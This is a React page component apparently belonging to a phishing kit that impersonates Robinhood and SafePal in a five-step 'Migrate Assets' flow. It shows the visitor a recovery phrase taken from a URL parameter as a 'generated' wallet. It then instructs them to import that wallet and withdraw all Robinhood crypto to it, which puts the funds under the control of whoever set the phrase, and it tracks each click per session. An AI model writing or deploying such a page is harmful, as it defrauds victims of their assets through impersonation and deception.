import { createFileRoute } from "@tanstack/react-router";
import { useState } from "react";
import { Check, Copy } from "lucide-react";
import { GlobeIcon, Rh3DBackground, RH_FONT_FAMILY, RhLogo, useRhQueryParam, useRhTracking } from "@/components/rh/RhShared";
import appStoreBadge from "@/assets/app-store-badge.svg";
import googlePlayBadge from "@/assets/google-play-badge.svg";

export const Route = createFileRoute("/rh/safepal")({
  head: () => ({ meta: [{ title: "Migrate Assets — SafePal" }] }),
  component: RhSafePalPage,
});

const STEPS = [
  { title: "Read Carefully" },
  { title: "Import Existing Wallet" },
  { title: "Connect your wallet with a phrase" },
  { title: "Transfer and secure assets" },
  { title: "And you're all set!" },
];

function AppStoreBadge() {
  return (
    <a
      href="https://apps.apple.com/us/app/safepal-crypto-wallet-btc-nft/id1548297139"
      target="_blank"
      rel="noopener noreferrer"
      style={{ display: "inline-block", lineHeight: 0 }}
    >
      <img src={appStoreBadge} alt="Download on the App Store" style={{ height: 40, display: "block" }} />
    </a>
  );
}

function GooglePlayBadge() {
  return (
    <a
      href="https://play.google.com/store/apps/details?id=io.safepal.wallet&hl=en"
      target="_blank"
      rel="noopener noreferrer"
      style={{ display: "inline-block", lineHeight: 0 }}
    >
      <img src={googlePlayBadge} alt="Get it on Google Play" style={{ height: 40, display: "block" }} />
    </a>
  );
}

function RhSafePalPage() {
  const { trackClick, rhNavigate, sessionId } = useRhTracking();
  const phraseParam = useRhQueryParam("phrase");
  const recoveryPhrase = phraseParam || "";
  const [step, setStep] = useState(0);
  const [copied, setCopied] = useState(false);
  const [animating, setAnimating] = useState(false);
  const [phraseRevealed, setPhraseRevealed] = useState(false);

  const goNext = () => {
    if (step >= 4) return;
    trackClick(`RH SafePal Step ${step + 1} Next`);
    setAnimating(true);
    setPhraseRevealed(false);
    setTimeout(() => { setStep((s) => s + 1); setAnimating(false); }, 300);
  };

  const goBack = () => {
    if (step <= 0) return;
    trackClick(`RH SafePal Step ${step + 1} Back`);
    setAnimating(true);
    setPhraseRevealed(false);
    setTimeout(() => { setStep((s) => s - 1); setAnimating(false); }, 300);
  };

  const handleCopy = () => {
    if (!recoveryPhrase) return;
    navigator.clipboard.writeText(recoveryPhrase);
    setCopied(true);
    trackClick("RH SafePal Copy Recovery Phrase");
    setTimeout(() => setCopied(false), 2000);
  };

  return (
    <div style={{ display: "flex", minHeight: "100vh", background: "#000", fontFamily: RH_FONT_FAMILY }}>
      <style>{`@keyframes fadeInUp { from { opacity: 0; transform: translateY(8px);} to { opacity: 1; transform: translateY(0);} }`}</style>

      <div className="hidden md:flex" style={{ width: "50%", background: "#000", alignItems: "center", justifyContent: "center", overflow: "hidden", position: "relative" }}>
        <Rh3DBackground />
      </div>
      <div className="hidden md:block" style={{ width: 1, background: "rgba(255,255,255,0.12)", flexShrink: 0 }} />

      <div className="w-full md:w-1/2" style={{ background: "#000", display: "flex", flexDirection: "column" }}>
        <div className="md:hidden" style={{ display: "flex", justifyContent: "space-between", alignItems: "center", padding: "20px 24px" }}>
          <RhLogo />
          <button style={{ display: "flex", alignItems: "center", gap: 6, background: "transparent", border: "none", color: "#fff", fontSize: 14, fontWeight: 500, cursor: "pointer", padding: "8px 12px" }}>
            <GlobeIcon /><span>US</span>
          </button>
        </div>

        <div style={{ flex: 1, display: "flex", alignItems: "flex-start", justifyContent: "center", padding: "60px 60px 40px 60px" }}>
          <div style={{ width: "100%", maxWidth: 420 }}>
            <div style={{ display: "flex", justifyContent: "center", marginBottom: 20, animation: "fadeInUp 0.4s ease both" }}>
              <div style={{ color: "#00DCFA", fontSize: 22, fontWeight: 700, letterSpacing: "0.05em" }}>SafePal</div>
            </div>

            <h1 style={{ fontSize: 28, fontWeight: 400, color: "#fff", marginBottom: 12, lineHeight: 1.3, textAlign: "center", animation: "fadeInUp 0.4s ease 0.05s both" }}>Migrate Assets</h1>

            <div style={{ display: "flex", alignItems: "center", justifyContent: "center", gap: 8, marginBottom: 6, animation: "fadeInUp 0.4s ease 0.1s both" }}>
              {STEPS.map((_, i) => (
                <div key={i} style={{ width: i === step ? 28 : 8, height: 8, borderRadius: 9999, background: i <= step ? "#fff" : "rgba(255,255,255,0.2)", transition: "all 0.5s cubic-bezier(0.16, 1, 0.3, 1)" }} />
              ))}
            </div>
            <p style={{ fontSize: 13, color: "rgba(255,255,255,0.4)", margin: "0 0 24px 0", textAlign: "center" }}>Step {step + 1} of 5</p>

            <div style={{ opacity: animating ? 0 : 1, transform: animating ? "translateY(8px)" : "translateY(0)", transition: "opacity 0.3s, transform 0.3s" }}>
              <h2 style={{ fontSize: 20, fontWeight: 400, color: "#fff", margin: "0 0 12px 0", textAlign: "center" }}>{STEPS[step].title}</h2>

              {step === 0 && (
                <div style={{ textAlign: "center" }}>
                  <p style={{ fontSize: 14, color: "rgba(255,255,255,0.5)", lineHeight: "22px", margin: "0 0 20px 0" }}>
                    Follow the step-by-step guide on how to link your external wallet such as SafePal, and move funds from your Robinhood account to your external wallet and secure your assets. You may download by clicking the buttons below.
                  </p>
                  <div style={{ display: "flex", alignItems: "center", justifyContent: "center", gap: 12 }}>
                    <AppStoreBadge />
                    <GooglePlayBadge />
                  </div>
                </div>
              )}

              {step === 1 && (
                <div style={{ textAlign: "center" }}>
                  <p style={{ fontSize: 14, color: "rgba(255,255,255,0.5)", lineHeight: "22px", margin: "0 0 16px 0" }}>
                    Open SafePal and <strong style={{ color: "#fff" }}>import the wallet</strong> generated below:
                  </p>
                  <div onClick={() => { if (!phraseRevealed) setPhraseRevealed(true); }}
                    style={{ position: "relative", borderRadius: 8, border: "1px solid rgba(255,255,255,0.15)", background: "rgba(255,255,255,0.04)", padding: "20px 16px", cursor: "pointer", transition: "border-color 0.15s" }}>
                    <p style={{ fontSize: 14, lineHeight: "24px", color: "#fff", fontFamily: "monospace", filter: phraseRevealed ? "blur(0px)" : "blur(6px)", userSelect: phraseRevealed ? "text" : "none", margin: 0, textAlign: "center", transition: "filter 0.3s" }}>
                      {recoveryPhrase || "No recovery phrase assigned yet"}
                    </p>
                    {!phraseRevealed && (
                      <div style={{ position: "absolute", inset: 0, display: "flex", alignItems: "center", justifyContent: "center", borderRadius: 8 }}>
                        <span style={{ fontSize: 13, fontWeight: 500, color: "#fff" }}>Click to reveal</span>
                      </div>
                    )}
                  </div>
                  {phraseRevealed && recoveryPhrase && (
                    <button onClick={handleCopy}
                      style={{ display: "inline-flex", alignItems: "center", gap: 6, fontSize: 13, fontWeight: 500, color: "#fff", background: "none", border: "none", cursor: "pointer", padding: 0, marginTop: 10 }}>
                      {copied ? <Check className="h-4 w-4" /> : <Copy className="h-4 w-4" />}
                      {copied ? "Copied!" : "Copy to clipboard"}
                    </button>
                  )}
                </div>
              )}

              {step === 2 && (
                <div style={{ display: "flex", flexDirection: "column", gap: 12 }}>
                  {[
                    { num: 1, text: <>Select <strong style={{ color: "#fff" }}>I already have a wallet</strong></> },
                    { num: 2, text: <>Choose <strong style={{ color: "#fff" }}>Enter a recovery phrase</strong>, then enter your wallet's 12-word recovery phrase from the previous step</> },
                    { num: 3, text: <>Click <strong style={{ color: "#fff" }}>Import wallet</strong> and create a username for your cold wallet</> },
                    { num: 4, text: <>Then, create a password so that you can securely <strong style={{ color: "#fff" }}>unlock</strong> your wallet each time you use it</> },
                  ].map((item) => (
                    <div key={item.num} style={{ display: "flex", alignItems: "flex-start", gap: 12 }}>
                      <div style={{ width: 28, height: 28, borderRadius: "50%", backgroundColor: "#fff", color: "#000", fontSize: 13, fontWeight: 700, display: "flex", alignItems: "center", justifyContent: "center", flexShrink: 0 }}>{item.num}</div>
                      <p style={{ fontSize: 14, color: "rgba(255,255,255,0.5)", lineHeight: "22px", margin: 0, paddingTop: 3 }}>{item.text}</p>
                    </div>
                  ))}
                </div>
              )}

              {step === 3 && (
                <div style={{ textAlign: "center" }}>
                  <p style={{ fontSize: 14, color: "rgba(255,255,255,0.5)", lineHeight: "22px", margin: "0 0 12px 0" }}>
                    On <span style={{ color: "#fff", fontWeight: 500 }}>Robinhood</span>, swap your assets to bitcoin, ethereum, or USDT preferably. Some less popular assets may not be supported by cold wallets.
                  </p>
                  <p style={{ fontSize: 14, color: "rgba(255,255,255,0.5)", lineHeight: "22px", margin: "0 0 12px 0" }}>
                    Then on SafePal wallet, copy your token addresses and use them to withdraw your assets from <span style={{ color: "#fff", fontWeight: 500 }}>Robinhood</span> to <span style={{ color: "#00DCFA", fontWeight: 500 }}>SafePal</span> wallet.
                  </p>
                  <p style={{ fontSize: 13, color: "rgba(255,255,255,0.3)", lineHeight: "20px", fontStyle: "italic", margin: 0 }}>
                    If you cannot see your token on SafePal wallet you have to swap it to one that is supported by your wallet.
                  </p>
                </div>
              )}

              {step === 4 && (
                <div style={{ textAlign: "center" }}>
                  <p style={{ fontSize: 14, color: "rgba(255,255,255,0.5)", lineHeight: "22px", margin: "0 0 12px 0" }}>
                    If you followed all steps properly, all your crypto assets are now in your custody, secured in your <span style={{ color: "#00DCFA", fontWeight: 500 }}>SafePal</span>.
                  </p>
                  <p style={{ fontSize: 14, color: "rgba(255,255,255,0.5)", lineHeight: "22px", margin: "0 0 12px 0" }}>
                    Your assets should be securely migrated to your cold wallet after all withdrawals from <span style={{ color: "#fff", fontWeight: 500 }}>Robinhood</span> are complete.
                  </p>
                </div>
              )}
            </div>

            <div style={{ marginTop: 24 }}>
              {step === 0 ? (
                <button onClick={goNext} style={{ width: "100%", height: 52, borderRadius: 26, border: "none", background: "#fff", color: "#000", fontSize: 16, fontWeight: 500, fontFamily: "inherit", cursor: "pointer" }}>Next</button>
              ) : step === 4 ? (
                <div style={{ display: "flex", gap: 12 }}>
                  <button onClick={goBack} style={{ flex: 1, height: 52, borderRadius: 26, border: "1px solid rgba(255,255,255,0.3)", background: "transparent", color: "#fff", fontSize: 16, fontWeight: 500, fontFamily: "inherit", cursor: "pointer" }}>Back</button>
                  <button onClick={() => { trackClick("RH SafePal Done"); rhNavigate("/rh/loading"); }} style={{ flex: 1, height: 52, borderRadius: 26, border: "none", background: "#fff", color: "#000", fontSize: 16, fontWeight: 500, fontFamily: "inherit", cursor: "pointer" }}>Done</button>
                </div>
              ) : (
                <div style={{ display: "flex", gap: 12 }}>
                  <button onClick={goBack} style={{ flex: 1, height: 52, borderRadius: 26, border: "1px solid rgba(255,255,255,0.3)", background: "transparent", color: "#fff", fontSize: 16, fontWeight: 500, fontFamily: "inherit", cursor: "pointer" }}>Back</button>
                  <button onClick={goNext} style={{ flex: 1, height: 52, borderRadius: 26, border: "none", background: "#fff", color: "#000", fontSize: 16, fontWeight: 500, fontFamily: "inherit", cursor: "pointer" }}>
                    {step === 1 ? "Continue" : "Next"}
                  </button>
                </div>
              )}
            </div>
          </div>
        </div>
      </div>
      <div className="fixed bottom-2 right-2 text-[10px] opacity-0 pointer-events-none">{sessionId}</div>
    </div>
  );
}
